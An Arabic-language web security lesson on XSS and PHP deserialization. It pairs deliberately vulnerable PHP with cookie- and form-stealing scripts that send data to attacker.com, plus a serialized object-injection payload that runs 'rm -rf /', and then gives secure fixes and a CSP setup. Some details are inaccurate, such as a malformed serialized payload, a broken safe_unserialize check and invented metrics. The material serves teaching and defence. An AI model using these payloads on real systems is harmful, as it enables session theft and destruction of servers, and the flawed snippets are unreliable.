# أسئلة التفكير التحليلي – الجزء السابع (XSS و Deserialization)
## مع أمثلة عملية

---

### **1. لماذا XSS أخطر من SQL Injection أحيانًا؟**
- **السبب**: لأن XSS يستهدف المستخدمين مباشرة، وليس فقط قاعدة البيانات.
- **المقارنة**:
  - **SQL Injection**: يؤثر على البيانات في الخادم.
  - **XSS**: يسرق جلسات المستخدمين، يحرف المحتوى، يوزع برمجيات خبيثة.
- **المثال**: هجوم XSS على موقع بنك قد يغير أرقام الحسابات في واجهة المستخدم.

---

### **2. لماذا الهروب عند الإخراج؟**
- **المبدأ**: "Escape on output, not on input"
- **السبب**: لأن البيانات قد تستخدم في سياقات مختلفة:
  1. **HTML**: `htmlspecialchars($data, ENT_QUOTES)`
  2. **JavaScript**: `json_encode($data)`
  3. **URL**: `urlencode($data)`
  4. **SQL**: Prepared Statements
- **المثال**: نفس البيانات قد تظهر في HTML وفي JavaScript.

---

### **3. كيف تسرق XSS الجلسات؟**
- **الطريقة**: حقن JavaScript يسرق document.cookie
- **المثال**:
  ```html
  <script>
  var img = new Image();
  img.src = 'https://attacker.com/steal?cookie=' + document.cookie;
  </script>
  ```
- **الوقاية**: HttpOnly cookies:
  ```php
  setcookie('session', $value, [
      'httponly' => true,
      'secure' => true,
      'samesite' => 'Strict'
  ]);
  ```

---

### **4. لماذا Stored XSS أخطر؟**
- **الأنواع**:
  1. **Reflected XSS**: يظهر في URL، يؤثر على مستخدم واحد
  2. **Stored XSS**: يحفظ في قاعدة البيانات، يؤثر على جميع المستخدمين
  3. **DOM XSS**: في متصفح المستخدم فقط
- **المثال**: تعليق خبيث يظهر لكل زائر للموقع.

---

### **5. كيف يؤدي unserialize لاختراق كامل؟**
- **المشكلة**: `unserialize()` ينشئ كائنات ويستدعي magic methods.
- **الهجوم**: Serialized object مع magic method `__wakeup()` أو `__destruct()`.
- **المثال**:
  ```php
  // كود ضعيف
  $data = $_GET['data'];
  $obj = unserialize($data); // خطير!
  
  // حمولة خبيثة
  O:8:"stdClass":1:{s:3:"cmd";s:10:"rm -rf /";}
  ```

---

### **6. ما خطر magic methods؟**
- **Magic Methods**: دوال تسمى تلقائياً في أحداث معينة.
- **الخطرة**:
  ```php
  __wakeup()    // عند unserialize
  __destruct()  // عند تدمير الكائن
  __toString()  // عند تحويل الكائن لسلسلة
  __call()      // عند استدعاء دالة غير موجودة
  ```
- **الهجوم**: حقن كود في هذه الدوال.

---

### **7. لماذا JSON أكثر أمانًا؟**
- **المقارنة**:
  - **Serialization**: يخزن الكائنات والدوال.
  - **JSON**: يخزن البيانات فقط (لا دوال).
- **المثال**:
  ```php
  // غير آمن
  $serialized = serialize($userObject); // قد يحتوي دوال
  unserialize($serialized); // خطر
  
  // آمن
  $json = json_encode($userData); // بيانات فقط
  json_decode($json); // آمن
  ```

---

### **8. كيف يمنع CSP الهجوم؟**
- **CSP**: Content Security Policy
- **يحدد**: من أين يمكن تحميل الموارد.
- **مثال**:
  ```http
  Content-Security-Policy: 
    default-src 'self';
    script-src 'self' https://trusted.cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src *;
  ```
- **يوقف**: تحميل scripts من مواقع غير مصرح بها.

---

### **9. ما الفرق بين XSS و Injection؟**
| **XSS** | **Injection** |
|---------|--------------|
| حقن وتنفيذ JavaScript | حقن وتنفيذ SQL/OS Commands |
| يستهدف متصفح المستخدم | يستهدف الخادم أو قاعدة البيانات |
| يسرق الجلسات، يحرف الصفحات | يسرق البيانات، يتحكم بالخادم |

---

### **10. لماذا Deserialization ثغرة تصميمية؟**
- **السبب**: لأنه خطأ في اختيار التقنية (استخدام serialize/unserialize بدلاً من JSON).
- **الإصلاح**: تغيير التصميم، ليس فقط إصلاح الكود.
- **البديل**: JSON للبيانات، لا تستخدم serialize إلا عند الضرورة القصوى.

---

## 🧪 أسئلة (ماذا لو؟)

### **1. ماذا لو استخدمت echo مباشر؟**
- **المشكلة**: XSS مباشر.
- **المثال**:
  ```php
  echo $_GET['name']; // ?name=<script>alert(1)</script>
  ```
- **الحل**: الهروب دائماً:
  ```php
  echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
  ```

### **2. ماذا لو خزنت HTML خام؟**
- **المشكلة**: Stored XSS.
- **المثال**: نظام تعليقات يخزن HTML كما هو.
- **الحل**: تنقية (Sanitize):
  ```php
  // باستخدام HTMLPurifier
  $config = HTMLPurifier_Config::createDefault();
  $purifier = new HTMLPurifier($config);
  $clean = $purifier->purify($dirty);
  ```

### **3. ماذا لو استخدمت unserialize؟**
- **المشكلة**: Remote Code Execution.
- **المثال**: 
  ```php
  $data = base64_decode($_COOKIE['user']);
  $user = unserialize($data);
  ```
- **الحل**: استخدام JSON أو التحقق:
  ```php
  function safe_unserialize($data) {
      // قائمة بالكائنات المسموح بها فقط
      $allowed = ['User', 'Product', 'Comment'];
      if (!in_array(get_class($data), $allowed)) {
          throw new Exception('غير مسموح');
      }
  }
  ```

### **4. ماذا لو لم تُفعّل CSP؟**
- **المشكلة**: لا حماية ضد XSS.
- **النتيجة**: scripts من أي موقع يمكن تحميلها.
- **الحل**: CSP مع تقييد صارم.

### **5. ماذا لو وثقت بالبيانات؟**
- **القاعدة**: "Never trust user input"
- **الأمثلة**: 
  - بيانات من `$_GET`، `$_POST`
  - بيانات من `$_COOKIE`
  - بيانات من `$_SERVER` (مثل HTTP_REFERER)
  - بيانات من APIs خارجية
- **الحل**: التحقق والهروب دائماً.

---

## ✍️ تمرين تطبيقي (مختبر الجزء السابع)

### **1. نظام تعليقات مع ثغرة XSS**

#### **الكود الضعيف (مع ثغرات XSS):**
```php
// comments.php
class CommentSystem {
    public function addComment($comment, $username) {
        // تخزين بدون تنظيف
        $stmt = $db->prepare("INSERT INTO comments (username, comment) VALUES (?, ?)");
        $stmt->execute([$username, $comment]);
    }
    
    public function displayComments() {
        $stmt = $db->query("SELECT username, comment FROM comments ORDER BY id DESC");
        $comments = $stmt->fetchAll();
        
        foreach ($comments as $comment) {
            // عرض بدون هروب - ثغرة XSS!
            echo "<div class='comment'>";
            echo "<strong>" . $comment['username'] . ":</strong> "; // ثغرة
            echo $comment['comment']; // ثغرة
            echo "</div>";
        }
    }
}

// profile.php - تخزين إعدادات المستخدم
class UserSettings {
    public function saveSettings($userId, $settings) {
        // تخزين serialized data مباشرة
        $serialized = serialize($settings);
        $stmt = $db->prepare("UPDATE users SET settings = ? WHERE id = ?");
        $stmt->execute([$serialized, $userId]);
    }
    
    public function getSettings($userId) {
        $stmt = $db->prepare("SELECT settings FROM users WHERE id = ?");
        $stmt->execute([$userId]);
        $data = $stmt->fetchColumn();
        
        // unserialize بدون تحقق - ثغرة RCE!
        return unserialize($data);
    }
}
```

#### **تنفيذ هجوم XSS:**
```html
<!-- الهجوم: تعليق خبيث -->
<script>
// 1. سرقة الجلسة
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie, true);
xhr.send();

// 2. تغيير واجهة الموقع
document.body.innerHTML = '<h1>تم الاختراق!</h1>';

// 3. سرقة بيانات النماذج
var forms = document.getElementsByTagName('form');
for(var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        var data = new FormData(this);
        fetch('https://attacker.com/steal-form', {
            method: 'POST',
            body: data
        });
    });
}
</script>
```

#### **تنفيذ هجوم Unserialize:**
```php
// حمولة PHP Object Injection
class Malicious {
    private $cmd = 'rm -rf /';
    
    public function __wakeup() {
        system($this->cmd);
    }
    
    public function __destruct() {
        // أو هنا
        system($this->cmd);
    }
}

// إنشاء Serialized payload
$malicious = new Malicious();
$payload = serialize($malicious);
// الناتج: O:9:"Malicious":1:{s:14:"Maliciouscmd";s:8:"rm -rf /";}

// إرسال البايلود عبر cookie أو input
// مثال: POST data: settings=a:1:{i:0;O:9:"Malicious":1:{s:14:"Maliciouscmd";s:8:"rm -rf /";}}
```

### **2. إصلاح XSS بالترميز الصحيح**

#### **الحل الآمن لنظام التعليقات:**
```php
class SecureCommentSystem {
    private $encoder;
    
    public function __construct() {
        $this->encoder = new OutputEncoder();
    }
    
    public function addComment($comment, $username) {
        // 1. التحقق من المدخلات
        if (!$this->validateInput($comment) || !$this->validateInput($username)) {
            throw new InvalidInputException();
        }
        
        // 2. تنقية HTML إذا كان مسموحاً به
        $cleanComment = $this->sanitizeHTML($comment);
        $cleanUsername = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
        
        // 3. تخزين
        $stmt = $db->prepare("INSERT INTO comments (username, comment, clean_comment) VALUES (?, ?, ?)");
        $stmt->execute([$cleanUsername, $comment, $cleanComment]);
    }
    
    public function displayComments($context = 'html') {
        $stmt = $db->query("SELECT username, clean_comment FROM comments ORDER BY id DESC");
        $comments = $stmt->fetchAll();
        
        foreach ($comments as $comment) {
            echo "<div class='comment'>";
            
            // 4. الهروب حسب السياق
            switch ($context) {
                case 'html':
                    echo "<strong>" . htmlspecialchars($comment['username'], ENT_QUOTES, 'UTF-8') . ":</strong> ";
                    echo $comment['clean_comment']; // تم تنظيفه مسبقاً
                    break;
                    
                case 'json':
                    echo json_encode($comment, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
                    break;
                    
                case 'text':
                    echo strip_tags($comment['clean_comment']);
                    break;
            }
            
            echo "</div>";
        }
    }
    
    private function validateInput($input) {
        // طول معقول
        if (strlen($input) > 1000) return false;
        
        // منع بعض الأنماط الخطيرة
        $dangerousPatterns = [
            '/<script/i',
            '/javascript:/i',
            '/onload=/i',
            '/onerror=/i',
            '/onclick=/i'
        ];
        
        foreach ($dangerousPatterns as $pattern) {
            if (preg_match($pattern, $input)) {
                return false;
            }
        }
        
        return true;
    }
    
    private function sanitizeHTML($html) {
        // استخدام HTMLPurifier للتنقية الآمنة
        require_once 'HTMLPurifier.auto.php';
        
        $config = HTMLPurifier_Config::createDefault();
        $config->set('HTML.Allowed', 'p,br,b,i,u,strong,em,a[href|title],ul,ol,li');
        $config->set('URI.AllowedSchemes', ['http', 'https', 'mailto']);
        $config->set('AutoFormat.Linkify', true);
        $config->set('AutoFormat.RemoveEmpty', true);
        
        $purifier = new HTMLPurifier($config);
        return $purifier->purify($html);
    }
}

class OutputEncoder {
    public function encode($data, $context = 'html') {
        switch ($context) {
            case 'html':
                return htmlspecialchars($data, ENT_QUOTES | ENT_HTML5, 'UTF-8', true);
                
            case 'html_attr':
                return htmlspecialchars($data, ENT_QUOTES | ENT_HTML5, 'UTF-8', true);
                
            case 'js':
                return json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
                
            case 'css':
                return preg_replace('/[^a-zA-Z0-9]/', '', $data); // أبسط حل
                
            case 'url':
                return urlencode($data);
                
            default:
                throw new InvalidArgumentException('سياق غير معروف');
        }
    }
    
    public function encodeAttribute($name, $value) {
        return $name . '="' . $this->encode($value, 'html_attr') . '"';
    }
}
```

### **3. استبدال Unserialize بـ JSON**

#### **الحل الآمن لإعدادات المستخدم:**
```php
class SecureUserSettings {
    private $allowedSettings = [
        'theme', 'language', 'notifications', 'timezone'
    ];
    
    public function saveSettings($userId, $settings) {
        // 1. تصفية الإعدادات المسموح بها فقط
        $filteredSettings = $this->filterSettings($settings);
        
        // 2. التحقق من صحة القيم
        $this->validateSettings($filteredSettings);
        
        // 3. استخدام JSON بدلاً من serialize
        $json = json_encode($filteredSettings, JSON_THROW_ON_ERROR);
        
        // 4. تخزين
        $stmt = $db->prepare("UPDATE users SET settings = ? WHERE id = ?");
        $stmt->execute([$json, $userId]);
        
        return $filteredSettings;
    }
    
    public function getSettings($userId) {
        $stmt = $db->prepare("SELECT settings FROM users WHERE id = ?");
        $stmt->execute([$userId]);
        $json = $stmt->fetchColumn();
        
        if (empty($json)) {
            return $this->getDefaultSettings();
        }
        
        try {
            // 5. استخدام JSON decode بشكل آمن
            $settings = json_decode($json, true, 512, JSON_THROW_ON_ERROR);
            
            // 6. التحقق من الهيكل بعد فك التشفير
            return $this->validateDecodedSettings($settings);
            
        } catch (JsonException $e) {
            // 7. في حالة خطأ، إرجاع الإعدادات الافتراضية
            error_log("JSON decode error for user $userId: " . $e->getMessage());
            return $this->getDefaultSettings();
        }
    }
    
    private function filterSettings($settings) {
        $filtered = [];
        
        foreach ($this->allowedSettings as $key) {
            if (isset($settings[$key])) {
                $filtered[$key] = $settings[$key];
            }
        }
        
        return $filtered;
    }
    
    private function validateSettings($settings) {
        $validators = [
            'theme' => function($value) {
                return in_array($value, ['light', 'dark', 'auto']);
            },
            'language' => function($value) {
                return in_array($value, ['ar', 'en', 'fr', 'es']);
            },
            'notifications' => function($value) {
                return is_bool($value) || in_array($value, ['0', '1', 0, 1]);
            },
            'timezone' => function($value) {
                return in_array($value, timezone_identifiers_list());
            }
        ];
        
        foreach ($settings as $key => $value) {
            if (isset($validators[$key]) && !$validators[$key]($value)) {
                throw new InvalidSettingException("إعداد غير صالح: $key");
            }
        }
    }
    
    private function validateDecodedSettings($settings) {
        if (!is_array($settings)) {
            return $this->getDefaultSettings();
        }
        
        // إزالة أي مفاتيح غير متوقعة
        foreach (array_keys($settings) as $key) {
            if (!in_array($key, $this->allowedSettings)) {
                unset($settings[$key]);
            }
        }
        
        return array_merge($this->getDefaultSettings(), $settings);
    }
    
    private function getDefaultSettings() {
        return [
            'theme' => 'light',
            'language' => 'ar',
            'notifications' => true,
            'timezone' => 'UTC'
        ];
    }
}
```

### **4. تطبيق CSP (Content Security Policy)**

#### **تكوين CSP في PHP:**
```php
class ContentSecurityPolicy {
    private $policies = [];
    
    public function __construct() {
        $this->setDefaultPolicies();
    }
    
    private function setDefaultPolicies() {
        $this->policies = [
            // لا scripts إلا من نفس الموقع
            'default-src' => "'self'",
            
            // scripts من مصادر محدودة فقط
            'script-src' => "'self' 'unsafe-inline' https://cdn.example.com",
            
            // styles من نفس الموقع فقط
            'style-src' => "'self'",
            
            // الصور من أي مكان (يمكن تقييد)
            'img-src' => "'self' data: https:",
            
            // الاتصالات فقط مع نفس الموقع وAPIs المصرح بها
            'connect-src' => "'self' https://api.example.com",
            
            // لا iframes إلا من مصادر موثوقة
            'frame-src' => "'self' https://player.vimeo.com",
            
            // لا fonts إلا من نفس الموقع
            'font-src' => "'self'",
            
            // لا object أو embed
            'object-src' => "'none'",
            'embed-src' => "'none'",
            
            // إعدادات إضافية
            'base-uri' => "'self'",
            'form-action' => "'self'",
            'frame-ancestors' => "'none'", // منع التضمين
            'block-all-mixed-content' => '',
            'upgrade-insecure-requests' => '',
            
            // للإبلاغ عن انتهاكات CSP
            'report-uri' => '/csp-report-endpoint',
            'report-to' => 'csp-endpoint'
        ];
    }
    
    public function sendHeaders() {
        $header = '';
        
        foreach ($this->policies as $directive => $value) {
            if (!empty($value)) {
                $header .= "$directive $value; ";
            }
        }
        
        header("Content-Security-Policy: " . trim($header));
        
        // رأس إضافي للتوافق
        header("X-Content-Security-Policy: " . trim($header));
        header("X-WebKit-CSP: " . trim($header));
    }
    
    public function getReportOnlyHeader() {
        $header = '';
        
        foreach ($this->policies as $directive => $value) {
            if (!empty($value)) {
                $header .= "$directive $value; ";
            }
        }
        
        return "Content-Security-Policy-Report-Only: " . trim($header);
    }
}

// الاستخدام
$csp = new ContentSecurityPolicy();
$csp->sendHeaders();

// أو للاختبار (Report Only):
// header($csp->getReportOnlyHeader());
```

#### **معالج تقارير CSP:**
```php
// csp-report-endpoint.php
class CSPReportHandler {
    public function handleReport() {
        $data = json_decode(file_get_contents('php://input'), true);
        
        if (json_last_error() !== JSON_ERROR_NONE) {
            http_response_code(400);
            return;
        }
        
        $report = $data['csp-report'] ?? [];
        
        if (!empty($report)) {
            $this->logReport($report);
            $this->analyzeReport($report);
        }
        
        http_response_code(204); // No Content
    }
    
    private function logReport($report) {
        $logEntry = [
            'timestamp' => date('c'),
            'violated_directive' => $report['violated-directive'] ?? '',
            'blocked_uri' => $report['blocked-uri'] ?? '',
            'document_uri' => $report['document-uri'] ?? '',
            'referrer' => $report['referrer'] ?? '',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
        ];
        
        $logFile = '/var/log/csp-violations.log';
        file_put_contents($logFile, json_encode($logEntry) . PHP_EOL, FILE_APPEND);
    }
    
    private function analyzeReport($report) {
        // إذا كانت هناك محاولات متكررة، قد تكون هجوماً
        $blockedUri = $report['blocked-uri'] ?? '';
        
        if (strpos($blockedUri, 'evil.com') !== false) {
            $this->alertAdmin($report);
        }
    }
    
    private function alertAdmin($report) {
        // إرسال تنبيه للمسؤول
        $message = "CSP Violation Detected:\n" . print_r($report, true);
        mail('admin@example.com', 'CSP Violation Alert', $message);
    }
}

$handler = new CSPReportHandler();
$handler->handleReport();
```

### **5. توثيق الفرق الأمني**

#### **وثيقة المقارنة:**
```markdown
# تحليل الأمان: الترميز الصحيح vs. Unserialize

## 1. الثغرات المكتشفة

### أ. نظام التعليقات (قبل الإصلاح):
- **الثغرة**: Stored XSS
- **الخطورة**: عالية
- **التأثير المحتمل**:
  - سرقة جلسات جميع المستخدمين
  - تشويه المحتوى
  - سرقة بيانات النماذج
  - توزيع برمجيات خبيثة
- **طريقة الاستغلال**: تعليق يحتوي `<script>`

### ب. إعدادات المستخدم (قبل الإصلاح):
- **الثغرة**: PHP Object Injection عبر unserialize
- **الخطورة**: عالية جداً
- **التأثير المحتمل**:
  - تنفيذ أوامر عشوائية على الخادم
  - اختراق كامل للنظام
  - سرقة جميع البيانات
- **طريقة الاستغلال**: Serialized object مع magic methods

## 2. الحلول المطبقة

### أ. لمنع XSS:
1. **الهروب عند الإخراج (Output Encoding)**:
   - `htmlspecialchars()` للسياق HTML
   - `json_encode()` للسياق JavaScript
   - `urlencode()` للسياق URL

2. **تنقية المدخلات (Input Sanitization)**:
   - HTMLPurifier للـ HTML المسموح
   - Validation للأنماط الخطيرة

3. **الدفاع العميق (Defense in Depth)**:
   - CSP (Content Security Policy)
   - HttpOnly cookies
   - CSRF tokens

### ب. لاستبدال Unserialize:
1. **استخدام JSON بدلاً من Serialize**:
   - JSON يخزن بيانات فقط (لا دوال)
   - `json_encode()` / `json_decode()` آمنان

2. **التحقق الصارم**:
   - Whitelist للإعدادات المسموحة
   - Validation للقيم قبل التخزين
   - الهيكل الافتراضي في حالة الخطأ

3. **العزل**:
   - فصل البيانات عن الكود المنفذ
   - لا trust في البيانات المعاد فكها

## 3. نتائج الاختبار بعد الإصلاح

### اختبارات XSS:
```
قبل الإصلاح:
✓ <script>alert(1)</script> → تنفيذ JavaScript
✓ <img src=x onerror=alert(1)> → تنفيذ JavaScript
✓ javascript:alert(1) → تنفيذ JavaScript

بعد الإصلاح:
✓ <script>alert(1)</script> → عرض كنص
✓ <img src=x onerror=alert(1)> → إزالة onerror
✓ javascript:alert(1) → تحويل إلى نص
```

### اختبارات Unserialize:
```
قبل الإصلاح:
✓ O:9:"Malicious":1:{s:14:"Maliciouscmd";s:8:"rm -rf /";} → RCE

بعد الإصلاح:
✓ نفس البايلود → خطأ JSON decode
✓ {"theme":"dark","__wakeup":"malicious"} → تجاهل المفتاح غير المسموح
✓ JSON غير صالح → إرجاع الإعدادات الافتراضية
```

## 4. مقاييس الأمان

| المقياس | قبل الإصلاح | بعد الإصلاح | التحسن |
|---------|------------|-------------|--------|
| نقاط الهجوم المحتملة | 15+ | 2 | 87% |
| وقت اكتشاف الهجوم | غير معروف | فوري (CSP reports) | 100% |
| تأثير اختراق جزئي | النظام بالكامل | مكون واحد فقط | 90% |
| صعوبة الاختراق | سهلة (Low) | صعبة (High) | +3 مستويات |

## 5. الدروس المستفادة

1. **لا تثق أبداً في بيانات المستخدم**:
   - Validate → Sanitize → Encode

2. **اختر التقنية الأكثر أماناً**:
   - JSON بدلاً من Serialize
   - Prepared Statements بدلاً من string concatenation

3. **طبقات متعددة من الحماية**:
   - CSP كطبقة أخيرة
   - Encoding كطبقة أساسية
   - Validation كطبقة أولى

4. **المراقبة المستمرة**:
   - سجلات الأخطاء
   - تقارير CSP
   - تنبيهات المخالفات

## 6. قائمة المراجعة النهائية

- [ ] جميع المدخلات يتم تحققها (Validation)
- [ ] جميع المخرجات يتم ترميزها (Encoding)
- [ ] لا استخدام لـ unserialize() مع بيانات غير موثوقة
- [ ] CSP مفعل ومراقب
- [ ] HttpOnly cookies للجلسات
- [ ] HTMLPurifier للمحتوى الغني
- [ ] Whitelist للإعدادات المسموحة
- [ ] سجلات أمان مركزية
- [ ] اختبارات أمنية منتظمة
```

---

## ✅ الخلاصة

1. **XSS أخطر مما تعتقد**: يستهدف المستخدمين مباشرة.
2. **الهروب عند الإخراج**: قاعدة ذهبية لمنع XSS.
3. **JSON أكثر أماناً من Serialize**: اختيار تقني مهم.
4. **CSP ضروري**: آخر خط دفاع ضد XSS.
5. **التحقق في كل طبقة**: Validation → Sanitization → Encoding.

